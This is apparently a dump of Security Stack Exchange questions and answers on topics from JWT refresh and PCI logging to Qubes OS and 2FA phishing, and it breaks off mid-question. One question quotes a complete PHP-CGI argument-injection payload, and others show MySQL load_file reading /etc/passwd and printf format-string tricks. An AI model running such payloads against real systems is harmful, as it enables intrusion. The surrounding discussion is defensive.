<p>As for your other question, Tor creates a local SOCKS proxy and other applications needs to connect to that proxy. So far, Tor doesn't have a user-friendly way to route all system traffic through it, <a href=""https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy"">but there are some ways to do it</a>. I highly recommend using <a href=""https://tails.boum.org/"">Tails</a>, you can easily install it on your USB stick and it will load a full operating system configured for your privacy, with everything routed through Tor.</p>
","40632"
"How is Swatting (Twitch) streamers possible?","16267","","<p><a href=""https://en.wikipedia.org/wiki/Swatting"" rel=""nofollow"">Swatting</a> is when a person calls the SWAT team on a victim as a ""prank"", by falsely reporting some critical incident at the victim's home address. Swatting seems to be an incident that happen quite frequently to streamers in particular (e.g. Twitch.tv). However, in order for swatting to work, the home address of the victim must be known. While I accept that some people may inadvertently give out their home address on stream, <a href=""https://www.youtube.com/watch?v=TiW-BVPCbZk"" rel=""nofollow"">with the number of cases that have occurred</a>, I am wondering if perhaps the act of streaming somehow makes it easier to acquire a person's home address?</p>

<p>A few people have pointed out that you can trace the IP address of a streamer, and then do some additional research to find out a person's home. However, that seems unbelievable to me. For one, how does streaming leak a person's IP address? I thought that a streamer would upload their content to the streaming service (e.g. Twitch.tv) directly. Therefore unlike a P2P service such as Skype, the viewers do not need the IP Address of the streamer to watch the stream. Is that not true? Secondly, even if the IP Address is known, I still fail to see how one can determine the exact home address from that, since the IP address only gives a very rough approximation. Sure, some streamers give out their real name, and you can get an estimate of their gender/age/ethnicity based on their web cam footage, but is that really that much information?</p>

<p>Could someone explain this to me? Is it true that streaming exposes your IP address? How can one determine someone's home address from this information?</p>

<p>Finally, what can a streamer do to prevent their home address from being leaked out?</p>
","<p>This probably has nothing to do with the IP address used for streaming.</p>

<p>Many swatting events are based off of caller-ID spoofed Voice over IP calls using the home phone number of the victim and directed to the local 911 service or it's equivalent near where the victim lives. When these calls reach the local 911 dispatchers a database correlating the physical address to the number making the call appears on the screen for the dispatchers to use. So if anything it's probably more likely that people are simply looking for published phone numbers and spoofing the 911 calls from there. </p>

<p>Note: There are MANY ways to do this, they could also do this from any stolen cell phone and simply make up a story about where they are located.</p>

<p>Due to the increase in swatting events many law enforcement agencies are getting better at tracking the people calling these in and are now prosecuting them. </p>

<p><a href=""https://en.wikipedia.org/wiki/Swatting"">https://en.wikipedia.org/wiki/Swatting</a></p>

<p>Keep in mind that people have died from swatting and that this is a very dangerous and illegal act.</p>

<p><a href=""http://bearingarms.com/ex-marine-swatted-black-shopper-death-walmart-changes-story/"">http://bearingarms.com/ex-marine-swatted-black-shopper-death-walmart-changes-story/</a></p>

<p>Ultimately there are many sources where the person doing the swatting could get the information about the victims they are swatting and for someone who knows how to do this it's a relatively trivial to do. </p>

<p>In time as law enforcement gets better at quickly identifying the people who do this one would hope the rate at which this happens would go down drastically. </p>

<p>To answer your secondary question about hiding the streaming IP address take a look at Tor or potentially any number of VPN services. </p>

<p><a href=""http://tor.eff.org"">http://tor.eff.org</a></p>

<p>In regards to the streaming component, it appears that Twitch.tv requires video to be sent in the H.264 codec.</p>

<p><a href=""http://help.twitch.tv/customer/en/portal/articles/1253460-broadcast-requirements"">http://help.twitch.tv/customer/en/portal/articles/1253460-broadcast-requirements</a></p>

<p><a href=""https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC#Controversies"">https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC#Controversies</a></p>

<p>The H.264 codec itself doesn't contain any geolocation features like the EXIF typically data stored in photos. </p>

<p><a href=""https://en.wikipedia.org/wiki/Exchangeable_image_file_format#Geolocation"">https://en.wikipedia.org/wiki/Exchangeable_image_file_format#Geolocation</a></p>

<p>That said it does appear that several camera vendors area adding geolocation data into their videos and per the twitch.tv website they clearly state ""Twitch does not reencode your video after receiving it; whatever is sent to our servers is sent right back out to your viewers.""</p>

<p><a href=""http://help.twitch.tv/customer/en/portal/articles/1253460-broadcast-requirements"">http://help.twitch.tv/customer/en/portal/articles/1253460-broadcast-requirements</a></p>

<p>This would imply that if some video camera/mobile device manufacturers were to encode geolocation data into these video streams, or the accompanying audio streams, then yes this information could easily be extracted to provide a physical location directly from the stream. </p>

<p>I will point out that other large image services have explicitly chosen to remove EXIF and geolocation data from photos and videos to protect the privacy of their users. </p>

<p>Twitch.tv is not required to do this but it may be something wise for them to start doing to protect their users in the future, especially if it turns out this is the source of the swatting target selection process. </p>

<p>Another issue that may also come up, albeit less likely, is that geolocation data collected via HTML5 browser clients could potentially also be accessible to others using the website. This may not apply to twitch.tv but may be an issue for other websites. My point in mentioning this is simply that geolocation occurs at several levels (IP/Content/Metadata/encodings/out-of-band-data/browser leakage etc.)and it could potentially be extracted from a number of parts of the communications even if the streaming source IP is not the problem.</p>

<p>It may be worth spending time to see if you can search for the swatting victims phone numbers based on things you see and hear in their videos to determine if it seems like that's how it's happening. Sometimes these things are easier to find than one would initially think.</p>
","109936"
"What access does UK Police currently have to ISP logs, and what information can said logs provide?","16263","","<p>I'm currently researching a novel that has a crime element that centres around Internet-exclusive relationships and I would appreciate any help you might be able to offer regarding how much access the UK police have to ISP logs (and any other relevant Internet-based information) and what this information might tell them.</p>

<p>A little more info on the basic scenario: computer equipment has been thoroughly destroyed (on a bonfire &mdash; the platters melted, etc.) and the owner has been murdered. The criminal investigators have reason to believe that there is an Internet relationship to be investigated but, because of the destroyed equipment, do not have the access to the information that they normally might. So, what could they do about investigating through ISP logs, bearing in mind that the individual concerned is now dead?</p>

<p>Also, am I right in thinking that, under current legislation, police have no access to Facebook accounts/logs and Skype?</p>
","<p>There's a decent article on the BBC on this type of information here: <a href=""http://www.bbc.co.uk/news/technology-17586605"">http://www.bbc.co.uk/news/technology-17586605</a></p>

<p>In terms of what they'd get from an ISP, the likelihood is that it would be what they accessed and when, search results, search terms etc. However, the contents of online conversations wouldn't be available though they might be identified in on-line forums, blog posts, comments etc. Also, all information posted to Facebook would be available - police have to request this access. If it can be identified who the protagonist had Skype conversations with, I'm sure the history could be restored - this would likely require a warrant with Microsoft rather than the ISP. They should also be able to get access to online email accounts such as hotmail/gmail/yahoo by serving warrants to those parties.</p>

<p>Another article : Google report reveals sharp increase in government requests for users' data - <a href=""http://www.guardian.co.uk/technology/2012/nov/13/google-transparency-report-government-requests-data"">http://www.guardian.co.uk/technology/2012/nov/13/google-transparency-report-government-requests-data</a></p>

<p>The length of time for which the police will be able to retrieve ISP logs is debateable though it's like this won't go back more than a few months so, if your protagonist's relationship isn't recent, the trail could go cold!</p>
","35212"
"Will antivirus detect all keyloggers?","16234","","<p>Our company schedules Security Training courses for our personnel.</p>

<p>In order for us to test them, we develop code such as keyloggers which we email to our personnel to detect stupid personnel, and of course we want to know whether our antiviruses detect this code.</p>

<p>We send keyloggers by email to all personnel and rename them to ""update or service packs"".</p>

<p>Many of them download and run them and ... We get user name and IP through a web service.</p>

<p>And we have noticed that our antivirus does not detect this code as malware.</p>

<p>Which software should we use to detect keyloggers and other similar malwares?</p>
","<p>No, anti-malware packages will not detect <em>every</em> form of keylogger. They will detect known ones by hashing, and some may detect certain keylogger-like behaviour via heuristic analysis.</p>

<p>However, I <strong>strongly</strong> advise you against this. First off, it's insulting to your employees. If I found out my employer was doing such a thing, I'd resign on the spot. Secondly, it's potentially illegal. I'd guess you're spying on people without their consent. You're opening yourself up to lawsuits. Finally, you're creating a security vulnerability - email isn't secure, and keyloggers are likely to contain company and personal credentials when users log into services. It's a security and privacy nightmare.</p>

<p>So, in my personal and professional opinion: <h2>DON'T DO THIS!</h2></p>
","23779"
"Is refreshing an expired JWT token a good strategy?","16224","","<p>If I understand best practices, JWT usually has an expiration date that is short-lived (~ 15 minutes). So if I don't want my user to log in every 15 minutes, I should refresh my token every 15 minutes.</p>

<p>I need to maintain a valid session for 7 days (UX point of view), so I have two solutions:</p>

<ul>
<li>use long-lived json web token (1 week)--bad practice?</li>
<li>getting a new json web token after the old one expires (JWT 15min, refresh allowed during 1 week)</li>
</ul>

<p>I'm forcing the use of HTTPS.</p>

<p>The <a href=""https://tools.ietf.org/rfc/rfc7519.txt"" rel=""nofollow noreferrer"">JWT standard</a> doesn't speak about refreshing tokens. Is refreshing an expired token a good strategy?</p>
","<p>Refreshing a token is done to confirm with the authentication service that the holder of the token <em>still</em> has access rights. This is needed because validation of the token happens via cryptographic means, without the need to contact the authentication service. This makes the evaluation of the tokens more efficient, but makes it impossible to retract access rights for the life of a token. </p>

<p>Without frequent refreshing, it is very difficult to remove access rights once they've been granted to a token. If you make the lifetime of a token a week, you will likely need to implement another means to handle, for example, the deletion of a user account, changing of a password (or other event requiring relogin), and a change in access permissions for the user.</p>

<p>So stick with the frequent refresh intervals. Once every 15-minutes shouldn't be enough to hurt your authentication service's performance.</p>
","119392"
"How is printf() in C/C++ a Buffer overflow vulnerability?","16172","","<p>According to an article I just read, the functions <code>printf</code> and <code>strcpy</code> are considered security vulnerabilities due to Buffer overflows. I understand how <code>strcpy</code> is vulnerable, but could someone possibly explain how/if printf is really vulnerable, or I am just understanding it wrong.</p>

<p>Here is the article: <a href=""https://www.digitalbond.com/blog/2012/09/06/100000-vulnerabilities/#more-11658"">https://www.digitalbond.com/blog/2012/09/06/100000-vulnerabilities/#more-11658</a></p>

<p>The specific snippet is :</p>

<blockquote>
  <p>The vendor had mechanically searched the source code and found some
  50,000-odd uses of buffer-overflow-capable C library functions such as
  “strcpy()” and “printf().”</p>
</blockquote>

<p>Thanks!</p>
","<p>It is possible to have issues with <code>printf()</code>, by using as format string a user-provided argument, i.e. <code>printf(arg)</code> instead of <code>printf(""%s"", arg)</code>. I have seen it done way too often. Since the caller did not push extra arguments, a string with some spurious <code>%</code> specifiers can be used to read whatever is on the stack, and with <code>%n</code> some values can be <em>written</em> to memory (<code>%n</code> means: ""the next argument is an <code>int *</code>; go write there the number of characters emitted so far).</p>

<p>However, I find it more plausible that the article you quote contains a simple typographical mistake, and really means <code>sprintf()</code>, not <code>printf()</code>.</p>

<p>(I could also argue that apart from <code>gets()</code>, there is no inherently vulnerable C function; only functions which need to be used with <em>care</em>. The so-called ""safe"" replacements like <code>snprintf()</code> don't actually solve the problem; they hide it by replacing a buffer overflow with a silent truncation, which is less noisy but not necessarily better.)</p>
","43575"
"Web Application encryption key management","16161","","<p>In a nutshell, let's consider a web application which stores some information in a database as encrypted data. While I'm purposely trying to keep this some what generic, here are some assumptions:</p>

<ul>
<li>The encrypted data is only stored in the database (not elsewhere). Some fields in a given record are encrypted, some are not.</li>
<li>The web app must write the encrypted data to the database.</li>
<li>The web app must be able to read and display encrypted data. Data is only displayed in an authentication and authorized managed section of the app.</li>
<li>The data is sensitive information that needs to be protected in case the data is exposed/accessed (without the keys*).</li>
</ul>

<p><strong>Questions:</strong> </p>

<ul>
<li>Where/how do you store the key(s) used for encryption? Firstly, in a system where the web and database servers are the same, how do you manage the key? Secondly, in systems where the web server and DB servers are separate, how do you manage the key?</li>
<li>Are keys just permission-restricted files? Stored in some separate tool/software? I've seen mention that sometimes the encryption keys are also encrypted, but not clear on where that may help.</li>
</ul>

<p>I know this is a fairly basic security question and so if there are resources that perhaps I'm missing that would be also very, very helpful. I've spent a lot of time (over the years) trying to grasp this information based on information about web app security (OWASP, PCI DSS, etc.), but many times this information is very generic (e.g., ""protect the data"", ""encrypt the data"") or very specific (""to encrypt something with AES do this..."").</p>

<p>* I understand that this is not a complete security solution in it's own right. I understand that there are several vectors to get at this information and to decode it. I acknowledge that this may be a poor question in that light :)</p>

<p><em>Edited to add more information about the assumptions to this question</em></p>
","<p><strong>Where/how do you store the key(s) used for encryption?</strong> </p>

<p>Standard approach if you are using built in encryption on something like SQL or Oracle database, the database will generate an encryption key and encrypt this with another key protection key or Master key. This can be a pass-phrase or a longer key stored in e.g. .pem file. </p>

<p>This is usually stored in a restricted directory that only root/Administrator and the database service account can access. On database initiation the key is read and loaded into memory. This is then used to decrypt the encryption keys.</p>

<p><strong>Firstly, in a system where the web and database servers are the same, how do you manage the key?</strong> </p>

<p>Key is stored in a directory on the server. To renew or revoke is usually through the database program.</p>

<p><strong>Secondly, in systems where the web server and DB servers are separate, how do you manage the key?</strong></p>

<p>The key is stored locally on just the database server. A more secure option is to use a Hardware Security Module (HSM) in either scenario. This is a hardware device that is attached to the server and used to store the key rather than a restricted folder on the server. </p>

<p><strong>Are keys just permission-restricted files? Stored in some separate tool/software? I've seen mention that sometimes the encryption keys are also encrypted, but not clear on where that may help.</strong></p>

<p>Restricting the folder is acceptable as long as you manage the administrator access and monitor for things like unauthorized logins, logins as the service account, new accounts or groups added with access to the folder. As mentioned above a HSM is the more secure option if the data your are protecting and the threats that you are facing need it.</p>

<p>Generally the database will create instance or table keys and then encrypt this with the master key. There is minimal benefit in further encrypting the master key.</p>
","4757"
"Protect against POST //cgi-bin/php attacks?","16160","","<p>I am being attacked with this cgi injection:</p>

<blockquote>
  <p>POST
  //%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E
  HTTP/1.1</p>
</blockquote>

<p>This decodes as</p>

<blockquote>
  <p>//cgi-bin/php?-d allow_url_include=on -d safe_mode=off -d
  suhosin.simulation=on -d disable_functions="""" -d open_basedir=none -d
  auto_prepend_file=php://input -d cgi.force_redirect=0 -d
  cgi.redirect_status_env=0 -d auto_prepend_file=php://input -n</p>
</blockquote>

<p>Php version is 5.2.6-1+lenny13, yes thats old.</p>

<p>How can I prevent this attack?</p>
","<p>A <strong>system upgrade is required</strong> but here a quick fix.</p>

<p>In <code>/etc/apache2/sites-enabled/000-default</code> I comment out:</p>

<blockquote>
<pre><code>   ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
   &lt;Directory ""/usr/lib/cgi-bin""&gt;
           AllowOverride None
           Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
           Order allow,deny
           Allow from all
   &lt;/Directory&gt;
</code></pre>
</blockquote>

<p>And did a <code>apache2ctl restart</code>. Now <code>/cgi-bin/php</code> is not accessible anymore. That should fix it.</p>

<p>Wonder why this is in default anyway. You should also check other pages in <code>sites-enabled</code>. Do a <code>grep ""ExecCGI"" /etc/apache2/sites-enabled</code>.</p>
","46567"
"What is the safest way to deal with loads of incoming PDF files, some of which could potentially be malicious?","16159","","<p>As an investigative journalist I receive each day dozens of messages, many of which contain PDF documents. But I'm worried about some of the potentially malicious consequences of blindly opening them and getting my computer compromised. In the past, before I started working in investigative journalism, I was using <code>virustotal.com</code> to analyze all files (including PDFs) coming to my inbox, but that's not possible in this case as the files will be sent to them when they're meant to be confidential before release. And I heard that antivirus solutions are not 100% foolproof.</p>

<p>What is the safest way to deal with loads of incoming PDF files, some of which could potentially be malicious?</p>
","<p>I think the safest option for you would be to use <a href=""https://qubes-os.org/"" rel=""nofollow noreferrer"">Qubes OS</a> with its built in <a href=""https://www.qubes-os.org/doc/dispvm/"" rel=""nofollow noreferrer""><strong>DisposableVM</strong></a>s functionality, and its “<strong>Convert to Trusted PDF</strong>” tool.</p>

<h2>What is Qubes OS?</h2>

<p>Qubes is an operating system where it's all based on virtual machines. You can think of it as if you had different isolated ‘computers’ inside yours. So that way you can compartmentalize your digital life into different domains, so that you can have a ‘computer’ where you only do work related stuff, another ‘computer’ that is offline and where you store your password database and your PGP keys, and another ‘computer’ that is specifically dedicated for untrusted browsing... The possibilities are countless, and the only limit is your RAM and basically how much different ‘computers’ can be loaded at once. To insure that all these ‘computers’ are properly isolated from each other, and that they can't break to your host (called ‘<em>dom0</em>’ for domain 0) and thereby control all of your machine, Qubes uses the <a href=""https://en.wikipedia.org/wiki/Xen"" rel=""nofollow noreferrer"">Xen hypervisor</a>,<sup>[1]</sup> which is the same piece of software that is <a href=""https://en.wikipedia.org/wiki/Xen#Uses"" rel=""nofollow noreferrer"">relied upon by many major hosting providers</a> to isolate websites and services from each other such as Amazon EC2, IBM, Linode...
Another cool thing is that each one of your ‘computers’ has a special color that is reflected in the windows' borders. So you can choose red for the untrusted ‘computer’, and blue for your work ‘computer’ (see for example picture below). Thus in practice it becomes really easy to see which domain you're working at. So let's say now that some nasty malware gets into your untrusted virtual machine, then it can't break and infect other virtual machines that may contain sensitive information unless it has an exploit that can use a vulnerability in Xen to break into <em>dom0</em> (which is very rare), something that significantly raises the bar of security (before one would only need to deploy malware to your machine before controlling everything), and it will protect you from most attackers except the most resourced and sophisticated ones. </p>

<h2>What are DisposableVMs?</h2>

<p>The other answer mentioned that you can use a burner laptop. A Disposable Virtual Machine is kind of the same except that you're not bound by physical constraints: you have infinitely many disposable VMs at your wish. All it takes to create one is a click, and after you're done the virtual machine is destroyed. Pretty cool, huh? Qubes comes with a Thunderbird extension that lets you open file attachments in DisposableVMs, so that can be pretty useful for your needs.<sup>[2]</sup></p>

<p><img src=""https://i.stack.imgur.com/8SjhS.png"" alt=""enter image description here""></p>

<p>(Credits: <em>Micah Lee</em>)</p>

<h2>What's that “<strong>Convert to Trusted PDF</strong>” you were talking about?</h2>

<p>Let's say you found an interesting document, and let's say that you had an offline virtual machine specifically dedicated for storing and opening documents. Of course, you can directly send that document to that VM, but there could still be a chance that this document is malicious and may try for instance to delete all of your files (a behavior that you wouldn't notice in the short-lived DisposableVM). But you can also convert it into what's called a ‘Trusted PDF’. You send the file to a different VM, then you open the file manager, navigate to the directory of the file, right-click and choose “Convert to Trusted PDF”, and then send the file back to the VM where you collect your documents. But what does it exactly do? The “Convert to Trusted PDF” tool creates a new DisposableVM, puts the file there, and then transform it via a parser (that runs in the DisposableVM) that basically takes the RGB value of each pixel and leaves anything else. It's a bit like opening the PDF in an isolated environment and then ‘screenshoting it’ if you will. The file obviously gets much bigger, if I recall it transformed when I tested a 10Mb PDF into a 400Mb one. You can get much more details on that in this <a href=""https://theinvisiblethings.blogspot.lu/2013/02/converting-untrusted-pdfs-into-trusted.html"" rel=""nofollow noreferrer"">blogpost</a> by security researcher and Qubes OS creator Joanna Rutkowska.</p>

<hr>

<p><sup>[1] : The Qubes OS team are working on making it possible to support other hypervisors (such as KVM) so that you can not only choose different systems to run on your VMs, but also the very hypervisor that runs these virtual machines.</sup><br>
<sup>[2] : You also additionaly need to configure an option so that the DisposableVM-that is generated once you click on “Open in DispVM”-will be offline, so that they can't get your IP address. To do that:  ""By default, if a DisposableVM is created (by <code>Open in DispVM</code> or <code>Run in DispVM</code>) from within a VM that is not connected to the Tor gateway, the new DisposableVM may route its traffic over clearnet. This is because DisposableVMs inherit their NetVMs from the calling VM (or the calling VM's <code>dispvm_netvm</code> setting if different). The <code>dispvm_netvm</code> setting can be configured per VM by: <code>dom0 → Qubes VM Manager → VM Settings → Advanced → NetVM for DispVM</code>."" You'll need to set it to <code>none</code> so that it isn't connected to any network VM and wont have any Internet access.</sup><br>
<sup>[3] : Edit: This <a href=""https://security.stackexchange.com/a/152407/139336"">answer</a> mentions Subgraph OS, hopefully when a Subgraph <a href=""https://github.com/subgraph/subgraph-os-issues/issues/153"" rel=""nofollow noreferrer"">template VM is created for Qubes</a> you could use it with Qubes, making thus exploits much harder, and thanks to the integrated sandbox it would require another sandbox escape exploit as well as a Xen exploit to compromise your entire machine.</sup></p>
","151315"
"What logs to retain for PCI-DSS?","16148","","<p>I am using Splunk to centrally collect all of my logs for PCI-DSS. I'm running into my licensed volume limit and I need to know exactly what needs to be retained for regulatory compliance. </p>

<p>I am picking up a bunch of kerberos ticket events, mostly event 4769. Is there a specific reason these need to be retained? What about event 4672, special privileges assigned to a new logon? </p>

<p>I also have web servers which send in their IIS logs. These servers are sitting behind a Forefront TMG box which sends a more detailed version of the same data. Is there any reason that the IIS logs specifically need to be retained? </p>

<p>I would love some pointers on these events to what PCI requirement means they need to be maintained.</p>
","<p>Generally, the most conservative answer comes in the form of something easily understood, and approachable by the general populous.</p>

<p><img src=""https://i.stack.imgur.com/JhEuJ.jpg"" alt=""Log Retention Recommendations""></p>

<p>Ignoring the hyperbole of that kind of response, there are two things you must really take into account.</p>

<ol>
<li>What logs <em>should</em> I retain</li>
<li>How long should I retain said logs</li>
</ol>

<h1>Log Retention</h1>

<p>The answer to 2 is simple and well defined by the standard. Logs <strong>must</strong> be retained for one year and the last three months must be easily accessible. So let's translate that statement into my own recommendation</p>

<ul>
<li>Implement a centralized logging system, e.g. a single purpose system acting as a syslog receiver</li>
<li>If storage is available on central system, then retain all logs from PCI scoped systems for 1 year</li>
<li>Otherwise retain all logs from PCI scoped systems on central system for 3 months, rotate all  logs older than 3 months to long term storage (such as tape/VTL/papyrus). Expunge logs on long term storage that are older than 1 year.</li>
</ul>

<h1>Events to Log</h1>

<p>The answer to the first point is a little less well defined. The standard wants you to keep events and details for all PCI scoped systems. So assuming you have determined every system that <em>is</em> in scope, the only question is what what events you want to log. This is much harder to answer, because it would largely depend on your environment and what applications are running. The easy answer is to ask your QSA. To be conservative I would recommend adding <code>*.*  @logserver</code> to your syslog config files, or perform the Windows equivalent. Make sure that any non-syslog applications on those machines also find a way to get their logs out. This would include web server, fat clients, etc. At minimum make sure any authentications, successful <em>and</em> unsuccessful, are logged. If possible full audit logs of data access on applications would be nice. For web apps, this would be standard in your httpd logs, but fat clients may not be as granular.</p>

<p>In the end, since your QSA decides whether or not you are compliant, they are your best bet for answering these questions.</p>
","11072"
"Why does MYSQL's LOAD FILE only read some files and not others?","16071","","<p>As part of an assessment I'm using mysql to poke around at a compromised hosts' filesystem.  As I seemed to remember from the last time I played with it, some files can be read (eg. /etc/passwd) and others cannot (/etc/shells.)</p>

<p>The mysql documentation specifically says: For security reasons, when reading text files located on the server, the files must either reside in the database directory or be readable by all...
<a href=""https://dev.mysql.com/doc/refman/5.6/en/load-data.html"" rel=""nofollow"">https://dev.mysql.com/doc/refman/5.6/en/load-data.html</a></p>

<p>But that doesn't seem to be the case, since both files have the same effective permissions, and ownership and only the former can be read by load_data() or LOAD DATA INFILE.</p>

<pre><code>-rw-r--r--   1 root    root      73 Feb 13  2013 shells
-rw-r--r--   1 root    root    1.7K Oct  9 04:49 passwd

mysql&gt; select load_file(""/etc/passwd"");
| load_file(""/etc/passwd"")
| root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
</code></pre>

<p>...</p>

<pre><code>mysql&gt; select load_file(""/etc/shells"");
+--------------------------+
| load_file(""/etc/shells"") |
+--------------------------+
| NULL                     |
+--------------------------+
1 row in set (0.00 sec)
</code></pre>

<p>How is this discrimination performed and is it something that can be even further restricted?  (I know you can disable load data infile, but lets say you couldn't due to an ETL or something, how would you selectively enforce this on /etc/passwd for instance.)</p>
","<p>It looks like this is the apparmor conundrum.  I had ""stopped"" apparmor, and retested, but it didn't seem to matter.</p>

<p>Enabling APPARMOR_ENABLE_AAEVENTD so I could get logs on apparmor related denys:</p>

<p>vi /etc/apparmor/subdomain.conf </p>

<p>and updated the line: </p>

<pre><code>APPARMOR_ENABLE_AAEVENTD=""yes""
</code></pre>

<p>and restarted apparmor </p>

<pre><code>ori@myamdbox:/etc/apparmor$ sudo service apparmor restart
</code></pre>

<p>I then reran the load_file(""/etc/shells"") above and the log spewed out:</p>

<pre><code>Oct 10 04:03:13 myamdbox kernel: [85739.145281] type=1400 audit(1381374193.268:132): apparmor=""DENIED"" operation=""open"" parent=1 profile=""/usr/sbin/mysqld"" name=""/etc/shells"" pid=22485 comm=""mysqld"" requested_mask=""r"" denied_mask=""r"" fsuid=115 ouid=0
</code></pre>

<p>Tearing down the profile for a test worked, so it's certainly the culprit.  </p>

<p>To fix it simply I opened /etc/apparmor.d/usr.sbin.mysqld </p>

<p>and added the line: </p>

<p>...</p>

<pre><code>/etc/shells r, 
</code></pre>

<p>And yep, it works.</p>

<pre><code>mysql&gt; select load_file(""/etc/shells"");
+---------------------------------------------------------------------------+
| load_file(""/etc/shells"")                                                  |
+---------------------------------------------------------------------------+
| # /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
|
+---------------------------------------------------------------------------+
1 row in set (0.00 sec)
</code></pre>

<p>To do the opposite I need only find the reference in the apparmor config and remove it. </p>

<p>Thanks Lekensteyn!</p>
","43602"
"How often should an SSH key pair be changed?","16063","","<p>I've been using a 1024-bit RSA key for passwordless SSH between my own systems for years. More recently I've also started using it for passwordless access to my hosting providers and to source code repositories.</p>

<p>Is using the same key pair for an extended period of time, and to access multiple resources, an issue?</p>
","<p>Yes, strictly speaking it is recommended to expire SSH keys after a while (this could depend of the key length, vulnerabilities found in the key generator, etc.). However such mechanism was not foreseen by SSH. And it is cumbersome to go to every possible remote hosts and delete the public key.</p>

<p>There is a solution - though I never tried it yet, but keep it for when I will have some free time - <a href=""http://web.monkeysphere.info/why/#index2h2"">MonkeySphere for OpenSSH project</a>. It will allow to manage expiration of your keys as far as I understood it!</p>
","14984"
"Attacker circumventing 2FA. How to defend?","16044","","<p>Detailed in the <a href=""https://theintercept.com/2017/06/05/top-secret-nsa-report-details-russian-hacking-effort-days-before-2016-election/"" rel=""noreferrer"">latest NSA dump</a> is a method allegedly used by Russian intelligence to circumvent 2FA. (In this instance Google 2FA with the second factor being a code.)</p>

<p>It’s a fairly obvious scheme and one that I’m sure must be used regularly. 
It appears to work like this:</p>

<ol>
<li>URL is sent to target via spear phishing, the URL points to attacker
controlled phishing website that resembles Google Gmail.</li>
<li>User send credentials to the phony Gmail.</li>
<li>(Assumption) Attacker enters credentials into legitimate Gmail, and checks if a second factor is required.</li>
<li>Target receives legitimate second factor.</li>
<li>Phony Gmail site prompts target for second factor. Target sends second factor.</li>
<li>Attacker enters second factor into legitimate site and successfully authenticates.</li>
</ol>

<p>The only way I can see to defend against this attack is by spotting the phony site as being a scam or blocking the phishing site via FW’s, threat intel etc.</p>

<p>Is there any other practical way to defend against such a scheme? </p>

<p><a href=""https://i.stack.imgur.com/v0023.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/v0023.jpg"" alt=""enter image description here""></a></p>
","<p>Not all two-factor authentication schemes are the same.  Some forms of 2FA, such as sending you a text message, are not secure against this attack.  Other forms of 2FA, such as FIDO U2F, are secure against this attack -- they have been deliberately designed with this kind of attack in mind.</p>

<p>FIDO U2F provides two defenses against the man-in-the-middle attack:</p>

<ol>
<li><p><em>Registration</em> - The user registers their U2F device with a particular website (""origin""), such as <code>google.com</code>.  Then the U2F device will only respond to authentication requests from a registered origin; if the user is tricked into visiting <code>goog1e.com</code> (a phishing site), then the U2F won't respond to the request, since it can see that it is coming from a site that it hasn't been previously registered with.</p></li>
<li><p><em>Channel ID and origin binding</em> - U2F uses the TLS Channel ID extension to prevent man-in-the-middle attacks and enable the U2F device to verify that it is talking to the same web site that the user is visiting in their web browser.  Also, the U2F device knows what origin it thinks it is talking to, and its signed authentication response includes a signature over the origin it thinks it is talking to.  This is checked by the server.  So, if the user is on <code>goog1e.com</code> and that page requests a U2F authentication, the response from the U2F device indicates that its response is only good for communication with <code>goog1e.com</code> -- if the the attacker tries to relay this response to <code>google.com</code>, Google can notice that something has gone wrong, as the wrong domain name is present in the signed data.</p></li>
</ol>

<p>Both of these features involve integration between the U2F two-factor authentication device and the user's browser.  This integration allows the device to know what domain name (origin) the browser is visiting, and that allows the device to detect or prevent phishing and man-in-the-middle attacks.</p>

<p>Further reading on this mechanism:</p>

<ul>
<li><p>An <a href=""https://fidoalliance.org/specs/fido-u2f-v1.0-nfc-bt-amendment-20150514/fido-u2f-overview.html#man-in-the-middle-protections-during-authentication"" rel=""noreferrer"">excerpt</a> from the FIDO U2F spec, regarding defenses against MITM attacks.</p></li>
<li><p><a href=""https://developers.yubico.com/U2F/Protocol_details/Overview.html"" rel=""noreferrer"">Yubico's explanation</a> of the protocol flows.</p></li>
</ul>
","161445"
"How to list missing security updates for Windows servers?","16041","","<p>I have a list of applied security patches and updates, exported from Windows server 2003.</p>

<p>The exported list is in CSV format, but converting it is not a problem for me.</p>

<p>Is there any tool/site/script that will check this list and will return me the list of missing updates?</p>
","<p>I would recommend Iszi's answers above, but since you do not have access anymore these may not be feasible. I am not aware of any complete list out there listing all patches for a given platform, since the missing patches would also depend upon some other things installed that are not necessarily required (drivers, .NET, etc.). If you do not have access you are not the one who could implement the changes anyway. However, that said... you could install another fresh windows install, apply all patches, export the list, then diff them.</p>

<p>I just found this list of patches released for 2003: <a href=""http://support.microsoft.com/kb/914962"" rel=""nofollow"">http://support.microsoft.com/kb/914962</a> . It might be a good start for you.</p>
","23121"
"dns reflection attack vs dns amplification attack","16020","","<p>Over the past few weeks I have heard discussions about a DNS reflection attack and a DNS amplification attack.</p>

<p>Is there truly a difference between the two or are people just using 2 different names for the same attack method?</p>

<p><strong>DNS Amplification Attack definition 1</strong></p>

<blockquote>
  <p>A DNS Amplification Attack is a reflection-based Distributed Denial of
  Service (DDoS) attack. The attacker spoofs look-up requests to domain
  name system (DNS) servers to hide the source of the exploit and direct
